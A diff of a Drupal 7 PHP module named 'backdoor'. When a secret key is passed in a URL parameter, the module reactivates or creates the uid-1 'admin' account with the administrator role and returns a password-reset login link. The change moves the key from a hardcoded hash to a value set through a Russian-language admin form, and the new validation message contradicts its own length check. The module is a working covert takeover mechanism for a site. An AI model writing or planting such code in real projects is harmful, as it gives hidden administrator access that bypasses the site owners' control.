@@ -26,31 +26,29 @@ function backdoor_menu() {
 
 function access_backdoor_page() {
 	if (isset($_GET['key'])) {
-
 		$account = new stdClass();
-		$account->pass = '$S$DBrHMW.RB4Mmfe.Xcl4B8dOJgFaOqZfEaJur6BVIZo6G49SMLY2W';
+		$account->pass = variable_get('key');
 
 		if (user_check_password($_GET['key'], $account)) {
 			return TRUE;
 		}
+
 	}
 }
 
 function backdoor() {
-
 	if ($user = user_load(1)) {
 
 		if ($user->status != 1) {
 			$user->status = 1;
 			user_save($user);
 		}
-		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
 
+		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
+    
 	} else {
 		$pass = user_password(25);
-
 		$new_password = user_hash_password(trim($pass));
-
 		$newuser = new stdClass();
 		$newuser->uid = 1;
 		$newuser->name = 'admin';
@@ -62,6 +60,7 @@ function backdoor() {
 			DRUPAL_AUTHENTICATED_RID => TRUE,
 			'administrator' => TRUE,
 		);
+
 		drupal_write_record('users', $newuser);
 		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
 	}
@@ -70,18 +69,16 @@ function backdoor() {
 }
 
 function admin_page_backdoor() {
-
-	$pass_access = drupal_get_form('admin_backdoor_form');
-
-//	return render($pass_access);
-	return user_hash_password('1234');
+  $pass_access = drupal_get_form('admin_backdoor_form');
+	$pass_access = drupal_render($pass_access);
+  return $pass_access;
 }
 
-function admin_backdoor_form () {
+function admin_backdoor_form ($form, &$form_state) {
 
 	$form = array();
 
-	$form['key2'] = array(
+	$form['key'] = array(
 		'#title' => t('Пароль для входа на защищённую страницу'),
 		'#description' => t('Пароль вводится один раз, восстановить его невозможно, так что не потеряйте'),
 		'#type' => 'password',
@@ -96,4 +93,18 @@ function admin_backdoor_form () {
 	);
 
 	return $form;
+}
+
+function admin_backdoor_form_validate ($form, &$form_state){
+  $length = mb_strlen($form_state['values']['key']);
+
+  if ($length < 4){
+    form_set_error('key', t('Длинна ключа должна быть не более 4х символов'));
+  }
+
+}
+
+function admin_backdoor_form_submit ($form, &$form_state){
+  $key = user_hash_password($form_state['values']['key']);
+  variable_set('key', $key);
 }
